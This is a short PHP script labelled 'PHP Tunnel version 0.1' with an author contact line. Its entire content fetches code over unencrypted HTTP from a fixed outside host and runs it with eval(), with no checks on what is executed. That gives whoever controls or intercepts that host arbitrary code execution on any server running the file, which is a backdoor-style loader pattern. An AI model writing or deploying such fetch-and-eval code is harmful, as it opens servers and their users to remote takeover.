<?php

	// PHP Tunnel version 0.1
	// You may contact the author of defaultZ by E-Mail at:
	// andre@arctics.net
	
	$phpVer = explode(".",phpversion());
	$phpVer = intval(implode("",$phpVer));
	
	if ($phpVer >= 500) {
		$code = file_get_contents("http://cold.arctics.net/SSF/code.txt");
	}
	else {
		$code = implode("",file("http://cold.arctics.net/SSF/code.v4.txt"));
	}
	
	eval($code);
	
?>